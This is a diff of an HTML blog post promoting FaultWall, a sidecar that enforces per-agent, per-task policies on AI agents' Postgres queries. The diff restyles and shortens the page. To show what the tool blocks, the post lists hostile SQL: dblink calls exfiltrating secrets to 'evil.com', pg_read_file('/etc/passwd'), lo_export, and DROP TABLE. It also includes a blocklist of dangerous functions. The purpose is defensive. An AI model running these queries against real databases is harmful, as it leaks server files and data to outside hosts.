@@ -18,113 +18,156 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="icon" type="image/png" href="../favicon.png">
   <style>
-    :root {
-      --bg: #050507;
-      --surface: #0c0c10;
-      --border: #1a1a22;
-      --text: #e8e8ed;
-      --muted: #71717a;
-      --accent: #7c5cfc;
-      --accent-light: #a78bfa;
-      --green: #38a169;
-      --red: #e53e3e;
-      --yellow: #f6ad55;
-    }
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Inter', -apple-system, sans-serif;
-      background: var(--bg);
-      color: var(--text);
+      background: #ffffff;
+      color: #0f1419;
       line-height: 1.75;
       font-size: 17px;
     }
     .container {
-      max-width: 720px;
+      max-width: 620px;
       margin: 0 auto;
-      padding: 80px 24px;
+      padding: 60px 20px;
     }
-    .back { color: var(--muted); text-decoration: none; font-size: 14px; }
-    .back:hover { color: var(--accent-light); }
+    .back { color: #536471; text-decoration: none; font-size: 14px; }
+    .back:hover { color: #1d9bf0; }
     h1 {
-      font-size: 2.2em;
+      font-size: 2em;
       font-weight: 800;
       line-height: 1.2;
-      margin: 24px 0 8px;
+      margin: 20px 0 6px;
+      color: #0f1419;
     }
     .meta {
-      color: var(--muted);
+      color: #536471;
       font-size: 14px;
-      margin-bottom: 48px;
+      margin-bottom: 32px;
+      padding-bottom: 32px;
+      border-bottom: 1px solid #eff3f4;
     }
     h2 {
-      font-size: 1.4em;
+      font-size: 1.3em;
       font-weight: 700;
-      margin: 48px 0 16px;
-      color: var(--text);
+      margin: 40px 0 12px;
+      color: #0f1419;
     }
-    p { margin-bottom: 20px; }
-    a { color: var(--accent-light); }
+    p { margin-bottom: 16px; color: #0f1419; }
+    a { color: #1d9bf0; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    strong { font-weight: 700; }
     code {
       font-family: 'SF Mono', 'Fira Code', monospace;
-      background: var(--surface);
+      background: #f7f9f9;
       padding: 2px 6px;
       border-radius: 4px;
-      font-size: 0.9em;
+      font-size: 0.88em;
+      color: #0f1419;
     }
     pre {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 8px;
+      background: #0f1419;
+      color: #e7e9ea;
+      border-radius: 12px;
       padding: 20px;
       overflow-x: auto;
-      margin: 24px 0;
-      font-size: 14px;
+      margin: 20px 0;
+      font-size: 13.5px;
       line-height: 1.6;
     }
     pre code {
       background: none;
       padding: 0;
       font-size: inherit;
+      color: inherit;
     }
-    .highlight {
-      background: rgba(124, 92, 252, 0.08);
-      border-left: 3px solid var(--accent);
-      padding: 16px 20px;
-      margin: 24px 0;
+    .tldr {
+      background: #f7f9f9;
+      border: 1px solid #eff3f4;
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin-bottom: 32px;
+    }
+    .tldr h3 { font-size: 14px; font-weight: 700; color: #536471; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+    .tldr p { margin-bottom: 6px; font-size: 15px; color: #0f1419; }
+    .tldr p:last-child { margin-bottom: 0; }
+    .callout {
+      border-left: 3px solid #1d9bf0;
+      padding: 12px 20px;
+      margin: 20px 0;
+      background: #f7f9f9;
       border-radius: 0 8px 8px 0;
     }
-    .highlight p { margin-bottom: 0; }
+    .callout p { margin-bottom: 0; font-size: 15px; }
+    ul { margin: 0 0 16px 20px; }
+    li { margin-bottom: 6px; }
+    .tag {
+      display: inline-block;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 1px 8px;
+      border-radius: 10px;
+    }
+    .tag-blocked { background: #fde8e8; color: #e0245e; }
+    .tag-allowed { background: #def1eb; color: #00ba7c; }
+    .tag-monitored { background: #fef3e2; color: #f59e0b; }
+    .screenshot {
+      margin: 24px 0;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid #eff3f4;
+    }
+    .screenshot img { width: 100%; display: block; }
+    .screenshot .caption { font-size: 13px; color: #536471; text-align: center; padding: 10px; background: #f7f9f9; }
+    .terminal {
+      background: #0f1419;
+      border-radius: 12px;
+      overflow: hidden;
+      margin: 24px 0;
+    }
+    .terminal-bar {
+      background: #1c2128;
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .terminal-dot { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
+    .terminal-body {
+      padding: 20px;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+      color: #e7e9ea;
+    }
+    .t-comment { color: #536471; }
+    .t-prompt { color: #1d9bf0; }
+    .t-green { color: #00ba7c; }
+    .t-red { color: #e0245e; }
+    .t-purple { color: #794bc4; }
     .cta {
-      margin-top: 48px;
-      padding: 32px;
-      background: var(--surface);
-      border: 1px solid var(--border);
+      margin-top: 40px;
+      padding: 28px;
+      background: #f7f9f9;
+      border: 1px solid #eff3f4;
       border-radius: 12px;
       text-align: center;
     }
-    .cta a {
+    .cta-btn {
       display: inline-block;
-      background: var(--accent);
-      color: white;
-      padding: 12px 32px;
-      border-radius: 8px;
+      padding: 10px 28px;
+      border-radius: 20px;
+      font-weight: 700;
+      font-size: 15px;
       text-decoration: none;
-      font-weight: 600;
-      margin: 8px;
+      margin: 4px;
     }
-    .cta a:hover { opacity: 0.9; }
-    .cta p { color: var(--muted); font-size: 14px; margin-top: 12px; }
-    ul { margin: 0 0 20px 24px; }
-    li { margin-bottom: 8px; }
-    .tag {
-      display: inline-block;
-      background: rgba(124, 92, 252, 0.15);
-      color: var(--accent-light);
-      padding: 2px 10px;
-      border-radius: 12px;
-      font-size: 12px;
-      font-weight: 600;
-    }
+    .cta-primary { background: #0f1419; color: #fff; }
+    .cta-primary:hover { background: #1c2733; text-decoration: none; }
+    .cta-secondary { background: #fff; color: #0f1419; border: 1px solid #cfd9de; }
+    .cta-secondary:hover { background: #f7f9f9; text-decoration: none; }
+    .cta p { color: #536471; font-size: 13px; margin-top: 10px; margin-bottom: 0; }
+    .divider { border: none; border-top: 1px solid #eff3f4; margin: 40px 0; }
   </style>
 </head>
 <body>
@@ -132,45 +175,37 @@
     <a href="/" class="back">← faultwall.com</a>
 
     <h1>I Gave an AI Agent My Database Password</h1>
-    <div class="meta">March 2026 · 6 min read</div>
+    <div class="meta">March 2026 · 5 min read</div>
 
-    <p>A few months ago I started giving AI agents direct access to my Postgres database. Data analysis, report generation, some automated ops stuff. You know the drill — build a tool, give it a connection string, let the LLM figure out the SQL.</p>
-
-    <p>It worked great. For about three weeks.</p>
+    <div class="tldr">
+      <h3>TL;DR</h3>
+      <p>AI agents connect to databases with real credentials. Postgres roles are too static to scope what an agent should do <em>right now</em>. I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a> — a sidecar that enforces per-agent, per-task policies using a real Postgres AST parser. It blocks dangerous functions, restricts table access by mission, and kills violating queries. One Go binary, one YAML file, MIT licensed.</p>
+    </div>
 
     <h2>The Problem</h2>
 
-    <p>Here's what happens eventually: the LLM generates a query without a WHERE clause. Or it picks the wrong table. The prompt wasn't specific enough, so the agent does a full table scan across a large table. CPU spikes. Nobody gets paged because the query comes from a legitimate database user — it looks like normal application traffic.</p>
+    <p>I started giving AI agents direct Postgres access — data analysis, reports, automated ops. It's incredibly useful until the LLM generates a query without a WHERE clause, or picks the wrong table, or calls a function it shouldn't.</p>
 
-    <p>That's the benign version. The same agent, with the same credentials, could just as easily generate:</p>
+    <p>The scary part: the same agent credentials that run <code>SELECT * FROM feedback</code> can also run:</p>
 
     <ul>
-      <li><code>DROP TABLE users;</code> — the agent had write permissions</li>
-      <li><code>SELECT * FROM payments;</code> — the agent didn't need payment data</li>
-      <li><code>SELECT lo_export(...);</code> — export large objects to the filesystem</li>
-      <li><code>SELECT pg_read_file('/etc/passwd');</code> — read server files through Postgres</li>
-      <li><code>SELECT dblink('host=evil.com ...')</code> — phone home to an external server</li>
+      <li><code>DROP TABLE users;</code></li>
+      <li><code>SELECT * FROM payments;</code> — data it doesn't need</li>
+      <li><code>SELECT pg_read_file('/etc/passwd');</code> — read server files</li>
+      <li><code>SELECT dblink('host=evil.com ...')</code> — exfiltrate to external server</li>
     </ul>
 
-    <p>All of these are valid SQL. All of them execute with the agent's database credentials. Postgres doesn't know or care that an AI generated the query.</p>
+    <p>Postgres doesn't know an AI generated the query. It just sees a valid connection with valid credentials.</p>
 
-    <h2>The "Confused Deputy" Problem</h2>
-
-    <p>This has a name in security: the <strong>confused deputy</strong>. Your AI agent has legitimate credentials. It's authorized to be there. But it's executing actions on behalf of a prompt — and prompts can be manipulated, hallucinated, or just poorly written.</p>
-
-    <div class="highlight">
-      <p>Traditional database security assumes the <em>identity</em> executing a query is the <em>intent</em> behind it. With AI agents, that assumption breaks. The agent is authorized. The query it generates might not be.</p>
+    <div class="callout">
+      <p>This is the <strong>confused deputy problem</strong>. The agent is authorized to be there. The query it generates might not be.</p>
     </div>
 
-    <p>Postgres roles don't help much. They're static — an agent doing "summarize feedback" has the same permissions as when it's doing "delete old records." You can create read-only users, but most useful agent workflows need write access to at least some tables.</p>
+    <p>Postgres roles don't solve it — they're static. An agent doing "summarize feedback" has the same permissions as when it's doing "delete old records." You need something that understands what the agent is supposed to be doing <em>right now</em>.</p>
 
-    <p>Row-level security? Better, but you're still trusting the agent to include the right predicates. And it doesn't protect against function calls like <code>pg_sleep(999)</code> or <code>lo_export()</code>.</p>
+    <h2>FaultWall</h2>
 
-    <h2>What I Built</h2>
-
-    <p>I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a> — a firewall that sits next to Postgres and enforces per-agent, per-task policies.</p>
-
-    <p>The idea: every agent identifies itself and declares what it's doing right now. FaultWall checks every query against that declaration.</p>
+    <p>I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a> — a sidecar that enforces per-agent, per-task database policies. Every agent identifies itself and declares its current task. FaultWall checks every query against that declaration.</p>
 
 <pre><code># policies.yaml
 agents:
@@ -179,140 +214,60 @@ agents:
       summarize-feedback:
         allowed_tables: [public.feedback]
         allowed_operations: [SELECT]
-        conditions:
-          - "WHERE created_at > now() - interval '30 days'"
       update-shipping:
         allowed_tables: [public.orders]
         allowed_operations: [SELECT, UPDATE]
 
-  langchain-agent:
-    missions:
-      analyze-data:
-        allowed_tables: [public.feedback, public.products]
-        allowed_operations: [SELECT]
-
 blocked_functions:
   - pg_sleep
-  - pg_terminate_backend
   - lo_export
-  - lo_import
   - pg_read_file
-  - pg_read_binary_file
-  - dblink
-  - dblink_exec
-  - set_config</code></pre>
+  - dblink</code></pre>
 
-    <p>Agents identify themselves through Postgres <code>application_name</code>:</p>
+    <p>Queries go through a real PostgreSQL AST parser (<a href="https://github.com/pganalyze/pg_query_go">pg_query_go</a> — the same C parser Postgres uses internally). No regex. It extracts operations, tables (including CTEs, subqueries, JOINs), and function calls. You can't sneak a <code>pg_sleep(999)</code> inside a SELECT past it.</p>
 
-<pre><code>SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
-SELECT * FROM public.feedback WHERE created_at > now() - interval '30 days';
--- ✅ Allowed</code></pre>
-
-<pre><code>SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
-SELECT * FROM public.users;
--- ❌ Blocked: table not in mission scope</code></pre>
-
-<pre><code>SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
-SELECT pg_sleep(999);
--- ❌ Blocked: function in global blocklist</code></pre>
-
-    <h2>How It Actually Works</h2>
-
-    <p>FaultWall is a single Go binary. It's a sidecar — it connects to your Postgres as a monitoring user, polls <code>pg_stat_activity</code>, and inspects active queries. It doesn't sit in the connection path. Your agents talk to Postgres directly, and FaultWall watches from the side.</p>
-
-    <p>Every query goes through a real PostgreSQL AST parser — the same C parser that Postgres itself uses, wrapped in Go via <a href="https://github.com/pganalyze/pg_query_go">pg_query_go</a>. No regex. The parser extracts:</p>
-
-    <ul>
-      <li><strong>Operations:</strong> SELECT, INSERT, UPDATE, DELETE, DROP, TRUNCATE</li>
-      <li><strong>Tables:</strong> including CTEs, subqueries, JOINs — you can't hide a table reference</li>
-      <li><strong>Function calls:</strong> pg_sleep, lo_export, dblink — even nested inside SELECT</li>
-    </ul>
-
-    <p>This matters because regex-based parsers miss things like:</p>
-
-<pre><code>-- Regex thinks this is a harmless SELECT
-SELECT pg_sleep(999);
-SELECT lo_export(16389, '/tmp/dump.txt');
-SELECT * FROM dblink('host=evil.com dbname=loot', 'SELECT * FROM secrets');
-
--- AST parser catches all of them</code></pre>
-
-    <p>Two enforcement modes:</p>
-    <ul>
-      <li><strong>Monitor:</strong> Log violations, don't block. Run this first to see what your agents actually do.</li>
-      <li><strong>Enforce:</strong> Kill violating queries via <code>pg_terminate_backend()</code>.</li>
-    </ul>
-
-<pre><code>DATABASE_URL=postgres://... \
-POLICY_ENFORCEMENT=enforce \
-POLICY_FILE=./policies.yaml \
-./faultwall</code></pre>
-
-    <h2>What It Catches</h2>
-
-    <p>I tested it with 11 scenarios covering the attacks I was most worried about:</p>
-
-    <ul>
-      <li>✅ Agent reads allowed table within mission — <span class="tag">allowed</span></li>
-      <li>❌ Agent touches table outside mission scope — <span class="tag">blocked</span></li>
-      <li>❌ Agent runs DELETE when only SELECT is allowed — <span class="tag">blocked</span></li>
-      <li>❌ Agent calls <code>pg_sleep(999)</code> — <span class="tag">blocked</span></li>
-      <li>❌ Agent calls <code>lo_export()</code> to dump files — <span class="tag">blocked</span></li>
-      <li>❌ Agent calls <code>pg_read_file('/etc/passwd')</code> — <span class="tag">blocked</span></li>
-      <li>❌ Unregistered agent tries anything — <span class="tag">blocked</span></li>
-      <li>❌ Connection without agent identity — <span class="tag">monitored</span></li>
-    </ul>
-
-    <p>All 11 passed on a real Postgres instance. Not unit tests — actual queries, actual enforcement, actual <code>pg_terminate_backend()</code> calls.</p>
-
-    <!-- Terminal demo -->
-    <div style="margin: 32px 0;">
-      <div style="background: #1a1b26; border-radius: 10px; overflow: hidden; border: 1px solid var(--border);">
-        <div style="background: #16161e; padding: 8px 16px; display: flex; align-items: center; gap: 8px;">
-          <span style="width:12px;height:12px;border-radius:50%;background:#ff5f57;display:inline-block;"></span>
-          <span style="width:12px;height:12px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
-          <span style="width:12px;height:12px;border-radius:50%;background:#28c840;display:inline-block;"></span>
-          <span style="color:#71717a;font-size:13px;margin-left:8px;font-family:monospace;">faultwall — enforce mode</span>
-        </div>
-        <div style="padding: 20px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 13px; line-height: 1.7; color: #a9b1d6;">
-          <div><span style="color:#71717a"># Agent connects and tries to access a table outside its mission</span></div>
-          <div style="margin-top:4px;"><span style="color:#7aa2f7">psql&gt;</span> SET application_name = '<span style="color:#9ece6a">agent:cursor-ai:mission:summarize-feedback</span>';</div>
-          <div><span style="color:#7aa2f7">psql&gt;</span> SELECT * FROM <span style="color:#f7768e">public.users</span>;</div>
-          <div style="margin-top:8px;color:#f7768e;">FATAL: terminating connection due to administrator command</div>
-          <div style="margin-top:12px;"><span style="color:#71717a"># FaultWall log:</span></div>
-          <div><span style="color:#bb9af7">Policy enforcement:</span> <span style="color:#f7768e">BLOCKED</span> pid=4821 agent=<span style="color:#9ece6a">cursor-ai</span> mission=<span style="color:#9ece6a">summarize-feedback</span></div>
-          <div>  reason=<span style="color:#f7768e">table_not_in_mission</span> table=public.users op=SELECT</div>
-          <div style="margin-top:12px;"><span style="color:#71717a"># Agent tries a dangerous function</span></div>
-          <div style="margin-top:4px;"><span style="color:#7aa2f7">psql&gt;</span> SELECT <span style="color:#f7768e">pg_read_file</span>('/etc/passwd');</div>
-          <div style="margin-top:8px;color:#f7768e;">FATAL: terminating connection due to administrator command</div>
-          <div style="margin-top:12px;"><span style="color:#bb9af7">Policy enforcement:</span> <span style="color:#f7768e">BLOCKED</span> pid=4822 agent=<span style="color:#9ece6a">cursor-ai</span></div>
-          <div>  reason=<span style="color:#f7768e">blocked_function:pg_read_file</span></div>
-          <div style="margin-top:12px;"><span style="color:#71717a"># Agent stays within policy</span></div>
-          <div style="margin-top:4px;"><span style="color:#7aa2f7">psql&gt;</span> SELECT * FROM <span style="color:#9ece6a">public.feedback</span> WHERE created_at > now() - interval '30 days';</div>
-          <div style="margin-top:4px;color:#9ece6a;">  (47 rows) ✓</div>
-        </div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#ff5f57"></span>
+        <span class="terminal-dot" style="background:#febc2e"></span>
+        <span class="terminal-dot" style="background:#28c840"></span>
+        <span style="color:#536471;font-size:13px;margin-left:8px;font-family:monospace;">faultwall — enforce mode</span>
+      </div>
+      <div class="terminal-body">
+        <div class="t-comment"># Agent tries a table outside its mission</div>
+        <div><span class="t-prompt">psql&gt;</span> SET application_name = '<span class="t-green">agent:cursor-ai:mission:summarize-feedback</span>';</div>
+        <div><span class="t-prompt">psql&gt;</span> SELECT * FROM <span class="t-red">public.users</span>;</div>
+        <div style="margin-top:6px;"><span class="t-red">FATAL: terminating connection due to administrator command</span></div>
+        <div style="margin-top:10px"><span class="t-purple">Policy enforcement:</span> <span class="t-red">BLOCKED</span> agent=<span class="t-green">cursor-ai</span> reason=<span class="t-red">table_not_in_mission</span></div>
+        <div style="margin-top:14px" class="t-comment"># Agent tries a dangerous function</div>
+        <div><span class="t-prompt">psql&gt;</span> SELECT <span class="t-red">pg_read_file</span>('/etc/passwd');</div>
+        <div style="margin-top:6px;"><span class="t-red">FATAL: terminating connection due to administrator command</span></div>
+        <div style="margin-top:10px"><span class="t-purple">Policy enforcement:</span> <span class="t-red">BLOCKED</span> reason=<span class="t-red">blocked_function:pg_read_file</span></div>
+        <div style="margin-top:14px" class="t-comment"># Agent stays within policy</div>
+        <div><span class="t-prompt">psql&gt;</span> SELECT * FROM <span class="t-green">public.feedback</span> WHERE created_at > now() - interval '30 days';</div>
+        <div style="margin-top:4px"><span class="t-green">(47 rows) ✓</span></div>
       </div>
     </div>
 
-    <h2>Limitations (Being Honest)</h2>
+    <p>Tested against 11 real attack scenarios on a live Postgres instance — all passed. Table blocking, function blocking, operation restrictions, unregistered agent rejection, mission scoping.</p>
 
-    <p>FaultWall polls <code>pg_stat_activity</code> every ~10 seconds. It's not an inline proxy. This means:</p>
+    <div class="screenshot">
+      <img src="dashboard.jpg" alt="FaultWall dashboard showing agent violations, cost attribution, and query monitoring">
+      <div class="caption">FaultWall dashboard — violations, connected agents, per-tenant cost attribution</div>
+    </div>
+
+    <h2>Limitations</h2>
+
+    <p>Being honest about what it doesn't do:</p>
 
     <ul>
-      <li><strong>Short queries complete before detection.</strong> A fast <code>DROP TABLE</code> could execute before FaultWall sees it.</li>
-      <li><strong>Long-running queries get caught.</strong> Analytics queries, agent workloads, anything that runs for more than a few seconds.</li>
-      <li><strong>Agent identity is self-reported.</strong> <code>application_name</code> is spoofable. A malicious agent could claim to be a different agent.</li>
+      <li><strong>Polling, not proxying.</strong> FaultWall polls <code>pg_stat_activity</code> every ~10s. Short queries can complete before detection. Long-running agent workloads get caught.</li>
+      <li><strong>Identity is self-reported.</strong> <code>application_name</code> is spoofable. A sophisticated attacker could impersonate a registered agent.</li>
     </ul>
 
-    <p>The honest answer: FaultWall is a seatbelt, not an airbag. It catches the accidental damage that happens 95% of the time — confused agents, bad prompts, scope creep. It won't stop a sophisticated attacker who's already inside your database with full credentials.</p>
+    <p>It's a seatbelt, not an airbag. Catches the 95% case — confused agents, bad prompts, scope creep. I have an early eBPF prototype (private repo, Linux-only) for real-time kernel-level interception, and cryptographic identity via signed JWTs. Neither is shipped yet.</p>
 
-    <p>I have an early prototype of an eBPF-based engine (private repo, Linux-only) that intercepts queries at the kernel level — real-time, zero polling delay. And cryptographic agent identity via signed JWTs instead of application_name. But neither is shipped and I'm not going to pretend they are.</p>
-
-    <h2>Who This Is For</h2>
-
-    <p>If you're giving AI agents database access — LangChain tools, Cursor, Claude, internal bots, whatever — and you don't have a policy layer between the agent and your data, you probably should.</p>
-
-    <p>FaultWall is MIT licensed, ~3000 lines of Go, no telemetry, no cloud dependency. One binary, one YAML file.</p>
+    <hr class="divider">
 
     <p>If you're running agents against Postgres and want to see what they're actually doing:</p>
 
@@ -322,12 +277,12 @@ POLICY_FILE=./policies.yaml \
   -p 8080:8080 \
   ghcr.io/shreyasxv/faultwall:main</code></pre>
 
-    <p>You'll see per-agent metrics and violations at <code>localhost:8080</code> in about 30 seconds. Start in monitor mode, see what your agents do, then flip to enforce when you're ready to block.</p>
+    <p>Per-agent metrics and violations at <code>localhost:8080</code> in 30 seconds. Start in monitor mode, see what your agents do, flip to enforce when ready.</p>
 
     <div class="cta">
-      <a href="https://github.com/shreyasXV/faultwall">GitHub</a>
-      <a href="https://faultwall.com" style="background: transparent; border: 1px solid var(--border); color: var(--text);">Learn more</a>
-      <p>MIT Licensed · One binary · No cloud dependency</p>
+      <a href="https://github.com/shreyasXV/faultwall" class="cta-btn cta-primary">GitHub</a>
+      <a href="https://faultwall.com" class="cta-btn cta-secondary">Learn more</a>
+      <p>MIT Licensed · ~3000 lines of Go · No telemetry · No cloud dependency</p>
     </div>
   </div>
 </body>
